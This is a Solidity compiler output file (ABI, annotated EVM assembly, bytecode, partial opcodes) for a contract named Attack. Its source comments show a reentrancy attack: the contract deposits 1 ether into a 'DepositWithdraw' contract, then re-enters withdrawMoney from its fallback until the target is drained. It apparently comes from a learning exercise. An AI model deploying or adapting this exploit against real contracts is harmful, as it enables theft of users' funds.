{
	"contracts/Attack.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_contractAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "depositWithdraw",
					"outputs": [
						{
							"internalType": "contract DepositWithdraw",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Attack.sol\":556:1274  contract Attack{\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Attack.sol\":627:734  constructor(address _contractAddress){\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Attack.sol\":709:725  _contractAddress */\n  dup1\n    /* \"contracts/Attack.sol\":675:690  depositWithdraw */\n  0x00\n  dup1\n    /* \"contracts/Attack.sol\":675:726  depositWithdraw = DepositWithdraw(_contractAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Attack.sol\":627:734  constructor(address _contractAddress){\r... */\n  pop\n    /* \"contracts/Attack.sol\":556:1274  contract Attack{\r... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n    /* \"#utility.yul\":64:69   */\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":7:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:507   */\ntag_3:\n    /* \"#utility.yul\":226:232   */\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:362   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":281:360   */\n  tag_14\n  tag_15\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":243:362   */\ntag_13:\n    /* \"#utility.yul\":401:402   */\n  0x00\n    /* \"#utility.yul\":426:490   */\n  tag_16\n    /* \"#utility.yul\":482:489   */\n  dup5\n    /* \"#utility.yul\":473:479   */\n  dup3\n    /* \"#utility.yul\":462:471   */\n  dup6\n    /* \"#utility.yul\":458:480   */\n  add\n    /* \"#utility.yul\":426:490   */\n  tag_8\n  jump\t// in\ntag_16:\n    /* \"#utility.yul\":416:490   */\n  swap2\n  pop\n    /* \"#utility.yul\":372:500   */\n  pop\n    /* \"#utility.yul\":156:507   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":594:690   */\ntag_19:\n    /* \"#utility.yul\":631:638   */\n  0x00\n    /* \"#utility.yul\":660:684   */\n  tag_21\n    /* \"#utility.yul\":678:683   */\n  dup3\n    /* \"#utility.yul\":660:684   */\n  tag_22\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":649:684   */\n  swap1\n  pop\n    /* \"#utility.yul\":594:690   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:822   */\ntag_22:\n    /* \"#utility.yul\":733:740   */\n  0x00\n    /* \"#utility.yul\":773:815   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":766:771   */\n  dup3\n    /* \"#utility.yul\":762:816   */\n  and\n    /* \"#utility.yul\":751:816   */\n  swap1\n  pop\n    /* \"#utility.yul\":696:822   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":951:1068   */\ntag_15:\n    /* \"#utility.yul\":1060:1061   */\n  0x00\n    /* \"#utility.yul\":1057:1058   */\n  dup1\n    /* \"#utility.yul\":1050:1062   */\n  revert\n    /* \"#utility.yul\":1074:1196   */\ntag_11:\n    /* \"#utility.yul\":1147:1171   */\n  tag_28\n    /* \"#utility.yul\":1165:1170   */\n  dup2\n    /* \"#utility.yul\":1147:1171   */\n  tag_19\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":1140:1145   */\n  dup2\n    /* \"#utility.yul\":1137:1172   */\n  eq\n    /* \"#utility.yul\":1127:1190   */\n  tag_29\n  jumpi\n    /* \"#utility.yul\":1186:1187   */\n  0x00\n    /* \"#utility.yul\":1183:1184   */\n  dup1\n    /* \"#utility.yul\":1176:1188   */\n  revert\n    /* \"#utility.yul\":1127:1190   */\ntag_29:\n    /* \"#utility.yul\":1074:1196   */\n  pop\n  jump\t// out\n    /* \"contracts/Attack.sol\":556:1274  contract Attack{\r... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Attack.sol\":556:1274  contract Attack{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x6e0e0da2\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"contracts/Attack.sol\":819:828  0.5 ether */\n      0x06f05b59d3b20000\n        /* \"contracts/Attack.sol\":791:806  depositWithdraw */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Attack.sol\":783:815  address(depositWithdraw).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/Attack.sol\":783:828  address(depositWithdraw).balance >= 0.5 ether */\n      lt\n        /* \"contracts/Attack.sol\":780:906  if(address(depositWithdraw).balance >= 0.5 ether)\r... */\n      tag_8\n      jumpi\n        /* \"contracts/Attack.sol\":854:869  depositWithdraw */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Attack.sol\":854:883  depositWithdraw.withdrawMoney */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x54876921\n        /* \"contracts/Attack.sol\":884:893  0.5 ether */\n      0x06f05b59d3b20000\n        /* \"contracts/Attack.sol\":854:894  depositWithdraw.withdrawMoney(0.5 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_13:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Attack.sol\":780:906  if(address(depositWithdraw).balance >= 0.5 ether)\r... */\n    tag_8:\n        /* \"contracts/Attack.sol\":556:1274  contract Attack{\r... */\n      stop\n        /* \"contracts/Attack.sol\":1173:1269  function getBalance() public view returns (uint) {\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Attack.sol\":578:616  DepositWithdraw public depositWithdraw */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Attack.sol\":921:1103  function attack() public payable{\r... */\n    tag_5:\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      stop\n        /* \"contracts/Attack.sol\":1173:1269  function getBalance() public view returns (uint) {\r... */\n    tag_16:\n        /* \"contracts/Attack.sol\":1216:1220  uint */\n      0x00\n        /* \"contracts/Attack.sol\":1240:1261  address(this).balance */\n      selfbalance\n        /* \"contracts/Attack.sol\":1233:1261  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/Attack.sol\":1173:1269  function getBalance() public view returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/Attack.sol\":578:616  DepositWithdraw public depositWithdraw */\n    tag_21:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Attack.sol\":921:1103  function attack() public payable{\r... */\n    tag_25:\n        /* \"contracts/Attack.sol\":985:992  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/Attack.sol\":972:981  msg.value */\n      callvalue\n        /* \"contracts/Attack.sol\":972:992  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"contracts/Attack.sol\":964:993  require(msg.value >= 1 ether) */\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n        /* \"contracts/Attack.sol\":1004:1019  depositWithdraw */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Attack.sol\":1004:1027  depositWithdraw.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contracts/Attack.sol\":1034:1041  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/Attack.sol\":1004:1044  depositWithdraw.deposit{value:1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_29:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Attack.sol\":1055:1070  depositWithdraw */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Attack.sol\":1055:1084  depositWithdraw.withdrawMoney */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x54876921\n        /* \"contracts/Attack.sol\":1085:1092  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/Attack.sol\":1055:1093  depositWithdraw.withdrawMoney(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_32\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_34:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Attack.sol\":921:1103  function attack() public payable{\r... */\n      jump\t// out\n        /* \"#utility.yul\":7:182   */\n    tag_38:\n        /* \"#utility.yul\":116:175   */\n      tag_40\n        /* \"#utility.yul\":169:174   */\n      dup2\n        /* \"#utility.yul\":116:175   */\n      tag_41\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":111:114   */\n      dup3\n        /* \"#utility.yul\":104:176   */\n      mstore\n        /* \"#utility.yul\":7:182   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":188:371   */\n    tag_42:\n        /* \"#utility.yul\":301:364   */\n      tag_44\n        /* \"#utility.yul\":358:363   */\n      dup2\n        /* \"#utility.yul\":301:364   */\n      tag_45\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":296:299   */\n      dup3\n        /* \"#utility.yul\":289:365   */\n      mstore\n        /* \"#utility.yul\":188:371   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":377:558   */\n    tag_46:\n        /* \"#utility.yul\":489:551   */\n      tag_48\n        /* \"#utility.yul\":545:550   */\n      dup2\n        /* \"#utility.yul\":489:551   */\n      tag_49\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":484:487   */\n      dup3\n        /* \"#utility.yul\":477:552   */\n      mstore\n        /* \"#utility.yul\":377:558   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":564:682   */\n    tag_50:\n        /* \"#utility.yul\":651:675   */\n      tag_52\n        /* \"#utility.yul\":669:674   */\n      dup2\n        /* \"#utility.yul\":651:675   */\n      tag_53\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":646:649   */\n      dup3\n        /* \"#utility.yul\":639:676   */\n      mstore\n        /* \"#utility.yul\":564:682   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":688:954   */\n    tag_23:\n        /* \"#utility.yul\":803:807   */\n      0x00\n        /* \"#utility.yul\":841:843   */\n      0x20\n        /* \"#utility.yul\":830:839   */\n      dup3\n        /* \"#utility.yul\":826:844   */\n      add\n        /* \"#utility.yul\":818:844   */\n      swap1\n      pop\n        /* \"#utility.yul\":854:947   */\n      tag_55\n        /* \"#utility.yul\":944:945   */\n      0x00\n        /* \"#utility.yul\":933:942   */\n      dup4\n        /* \"#utility.yul\":929:946   */\n      add\n        /* \"#utility.yul\":920:926   */\n      dup5\n        /* \"#utility.yul\":854:947   */\n      tag_38\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":688:954   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":960:1234   */\n    tag_33:\n        /* \"#utility.yul\":1079:1083   */\n      0x00\n        /* \"#utility.yul\":1117:1119   */\n      0x20\n        /* \"#utility.yul\":1106:1115   */\n      dup3\n        /* \"#utility.yul\":1102:1120   */\n      add\n        /* \"#utility.yul\":1094:1120   */\n      swap1\n      pop\n        /* \"#utility.yul\":1130:1227   */\n      tag_57\n        /* \"#utility.yul\":1224:1225   */\n      0x00\n        /* \"#utility.yul\":1213:1222   */\n      dup4\n        /* \"#utility.yul\":1209:1226   */\n      add\n        /* \"#utility.yul\":1200:1206   */\n      dup5\n        /* \"#utility.yul\":1130:1227   */\n      tag_42\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":960:1234   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1240:1512   */\n    tag_10:\n        /* \"#utility.yul\":1358:1362   */\n      0x00\n        /* \"#utility.yul\":1396:1398   */\n      0x20\n        /* \"#utility.yul\":1385:1394   */\n      dup3\n        /* \"#utility.yul\":1381:1399   */\n      add\n        /* \"#utility.yul\":1373:1399   */\n      swap1\n      pop\n        /* \"#utility.yul\":1409:1505   */\n      tag_59\n        /* \"#utility.yul\":1502:1503   */\n      0x00\n        /* \"#utility.yul\":1491:1500   */\n      dup4\n        /* \"#utility.yul\":1487:1504   */\n      add\n        /* \"#utility.yul\":1478:1484   */\n      dup5\n        /* \"#utility.yul\":1409:1505   */\n      tag_46\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1240:1512   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1518:1740   */\n    tag_18:\n        /* \"#utility.yul\":1611:1615   */\n      0x00\n        /* \"#utility.yul\":1649:1651   */\n      0x20\n        /* \"#utility.yul\":1638:1647   */\n      dup3\n        /* \"#utility.yul\":1634:1652   */\n      add\n        /* \"#utility.yul\":1626:1652   */\n      swap1\n      pop\n        /* \"#utility.yul\":1662:1733   */\n      tag_61\n        /* \"#utility.yul\":1730:1731   */\n      0x00\n        /* \"#utility.yul\":1719:1728   */\n      dup4\n        /* \"#utility.yul\":1715:1732   */\n      add\n        /* \"#utility.yul\":1706:1712   */\n      dup5\n        /* \"#utility.yul\":1662:1733   */\n      tag_50\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1518:1740   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1746:1872   */\n    tag_62:\n        /* \"#utility.yul\":1783:1790   */\n      0x00\n        /* \"#utility.yul\":1823:1865   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1816:1821   */\n      dup3\n        /* \"#utility.yul\":1812:1866   */\n      and\n        /* \"#utility.yul\":1801:1866   */\n      swap1\n      pop\n        /* \"#utility.yul\":1746:1872   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1878:1955   */\n    tag_53:\n        /* \"#utility.yul\":1915:1922   */\n      0x00\n        /* \"#utility.yul\":1944:1949   */\n      dup2\n        /* \"#utility.yul\":1933:1949   */\n      swap1\n      pop\n        /* \"#utility.yul\":1878:1955   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1961:2109   */\n    tag_41:\n        /* \"#utility.yul\":2033:2042   */\n      0x00\n        /* \"#utility.yul\":2066:2103   */\n      tag_66\n        /* \"#utility.yul\":2097:2102   */\n      dup3\n        /* \"#utility.yul\":2066:2103   */\n      tag_67\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2053:2103   */\n      swap1\n      pop\n        /* \"#utility.yul\":1961:2109   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2115:2254   */\n    tag_45:\n        /* \"#utility.yul\":2191:2200   */\n      0x00\n        /* \"#utility.yul\":2224:2248   */\n      tag_69\n        /* \"#utility.yul\":2242:2247   */\n      dup3\n        /* \"#utility.yul\":2224:2248   */\n      tag_53\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2211:2248   */\n      swap1\n      pop\n        /* \"#utility.yul\":2115:2254   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2260:2398   */\n    tag_49:\n        /* \"#utility.yul\":2335:2344   */\n      0x00\n        /* \"#utility.yul\":2368:2392   */\n      tag_71\n        /* \"#utility.yul\":2386:2391   */\n      dup3\n        /* \"#utility.yul\":2368:2392   */\n      tag_53\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":2355:2392   */\n      swap1\n      pop\n        /* \"#utility.yul\":2260:2398   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2404:2530   */\n    tag_67:\n        /* \"#utility.yul\":2454:2463   */\n      0x00\n        /* \"#utility.yul\":2487:2524   */\n      tag_73\n        /* \"#utility.yul\":2518:2523   */\n      dup3\n        /* \"#utility.yul\":2487:2524   */\n      tag_74\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2474:2524   */\n      swap1\n      pop\n        /* \"#utility.yul\":2404:2530   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2536:2649   */\n    tag_74:\n        /* \"#utility.yul\":2586:2595   */\n      0x00\n        /* \"#utility.yul\":2619:2643   */\n      tag_76\n        /* \"#utility.yul\":2637:2642   */\n      dup3\n        /* \"#utility.yul\":2619:2643   */\n      tag_62\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2606:2643   */\n      swap1\n      pop\n        /* \"#utility.yul\":2536:2649   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122046ab2df0fe2239307c24280527c3ed7c729ad2e1994eb4349256dfbdd04906fb64736f6c63430008070033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060405161054d38038061054d8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600081519050610087816100f1565b92915050565b6000602082840312156100a3576100a26100ec565b5b60006100b184828501610078565b91505092915050565b60006100c5826100cc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100fa816100ba565b811461010557600080fd5b50565b610436806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe0146101155780636e0e0da2146101405780639e5faafc1461016b57610039565b5b6706f05b59d3b2000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101135760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663548769216706f05b59d3b200006040518263ffffffff1660e01b81526004016100e09190610346565b600060405180830381600087803b1580156100fa57600080fd5b505af115801561010e573d6000803e3d6000fd5b505050505b005b34801561012157600080fd5b5061012a610175565b6040516101379190610361565b60405180910390f35b34801561014c57600080fd5b5061015561017d565b6040516101629190610310565b60405180910390f35b6101736101a1565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003410156101b657600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561022657600080fd5b505af115801561023a573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166354876921670de0b6b3a76400006040518263ffffffff1660e01b81526004016102a0919061032b565b600060405180830381600087803b1580156102ba57600080fd5b505af11580156102ce573d6000803e3d6000fd5b50505050565b6102dd816103a6565b82525050565b6102ec816103b8565b82525050565b6102fb816103ca565b82525050565b61030a8161039c565b82525050565b600060208201905061032560008301846102d4565b92915050565b600060208201905061034060008301846102e3565b92915050565b600060208201905061035b60008301846102f2565b92915050565b60006020820190506103766000830184610301565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103b1826103dc565b9050919050565b60006103c38261039c565b9050919050565b60006103d58261039c565b9050919050565b60006103e7826103ee565b9050919050565b60006103f98261037c565b905091905056fea264697066735822122046ab2df0fe2239307c24280527c3ed7c729ad2e1994eb4349256dfbdd04906fb64736f6c63430008070033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x54D CODESIZE SUB DUP1 PUSH2 0x54D DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x8D JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x87 DUP2 PUSH2 0xF1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xA3 JUMPI PUSH2 0xA2 PUSH2 0xEC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xB1 DUP5 DUP3 DUP6 ADD PUSH2 0x78 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC5 DUP3 PUSH2 0xCC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xFA DUP2 PUSH2 0xBA JUMP JUMPDEST DUP2 EQ PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x436 DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x115 JUMPI DUP1 PUSH4 0x6E0E0DA2 EQ PUSH2 0x140 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x16B JUMPI PUSH2 0x39 JUMP JUMPDEST JUMPDEST PUSH8 0x6F05B59D3B20000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x113 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x54876921 PUSH8 0x6F05B59D3B20000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE0 SWAP2 SWAP1 PUSH2 0x346 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x121 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x12A PUSH2 0x175 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x137 SWAP2 SWAP1 PUSH2 0x361 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x155 PUSH2 0x17D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x162 SWAP2 SWAP1 PUSH2 0x310 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x173 PUSH2 0x1A1 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x1B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 